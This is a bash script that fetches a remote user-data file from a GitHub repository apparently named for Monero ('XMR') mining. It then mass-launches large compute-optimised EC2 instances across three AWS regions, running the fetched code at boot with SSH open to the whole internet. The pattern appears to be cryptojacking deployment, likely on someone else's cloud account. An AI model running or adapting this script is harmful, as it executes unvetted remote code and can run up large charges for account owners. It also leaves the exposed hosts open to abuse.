#!/bin/bash

# Define regions and their corresponding AMI IDs
declare -A region_image_map=(
    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
    ["us-west-2"]="ami-05d38da78ce859165"
    ["eu-north-1"]="ami-075449515af5df0d1"
)

# Set user_data file path based on OS
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
    user_data_file="C:/temp/user_data.sh"
else
    user_data_file="/tmp/user_data.sh"
fi

# GitHub URL containing the User Data script
user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/main/AnhThinXmr"

# Ensure temp directory exists
mkdir -p "$(dirname "$user_data_file")"

# Download User Data from GitHub
curl -s -L "$user_data_url" -o "$user_data_file"

# Verify if user-data was downloaded successfully
if [ ! -s "$user_data_file" ]; then
    echo "Error: Failed to download user-data from GitHub. Skipping EC2 deployment."
    exit 1
fi

# Make user-data executable (optional, in case it's a script)
chmod +x "$user_data_file"

# Convert Windows path to AWS-compatible path
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
    user_data_file_aws="file://$(echo $user_data_file | sed 's/\\/\//g')"
else
    user_data_file_aws="file://$user_data_file"
fi

# Loop through each region to deploy EC2 instances
for region in "${!region_image_map[@]}"; do
    echo "Deploying in region: $region"
    ami_id=${region_image_map[$region]}

    # Create Key Pair
    key_name="Nakamura-$region"
    if ! aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
        aws ec2 create-key-pair \
            --key-name "$key_name" \
            --region "$region" \
            --query "KeyMaterial" \
            --output text > "${key_name}.pem" || { echo "Warning: Failed to create Key Pair in $region"; continue; }
        chmod 400 "${key_name}.pem"
        echo "Key Pair $key_name created in $region"
    else
        echo "Key Pair $key_name already exists in $region"
    fi

    # Create Security Group
    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group \
            --group-name "$sg_name" \
            --description "Security group for $region" \
            --region "$region" \
            --query "GroupId" \
            --output text) || { echo "Warning: Failed to create Security Group in $region"; continue; }
        echo "Security Group $sg_name created with ID $sg_id in $region"
    else
        echo "Security Group $sg_name already exists with ID $sg_id in $region"
    fi

    # Ensure SSH (22) port is open
    if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
        aws ec2 authorize-security-group-ingress \
            --group-id "$sg_id" \
            --protocol tcp \
            --port 22 \
            --cidr 0.0.0.0/0 \
            --region "$region" || echo "Warning: Failed to configure SSH in $region"
        echo "SSH (22) access enabled for Security Group $sg_name in $region"
    else
        echo "SSH (22) access already configured for Security Group $sg_name in $region"
    fi

    # Launch 2 instances per region
    for i in {1..2}; do
        instance_id=$(aws ec2 run-instances \
            --image-id "$ami_id" \
            --count 1 \
            --instance-type "c7i.16xlarge" \
            --key-name "$key_name" \
            --security-group-ids "$sg_id" \
            --user-data "$user_data_file_aws" \
            --region "$region" \
            --query "Instances[0].InstanceId" \
            --output text 2>/dev/null)
        
        if [ -z "$instance_id" ]; then
            echo "Warning: Failed to launch EC2 instance in $region"
            continue
        fi
        
        echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
    done
done
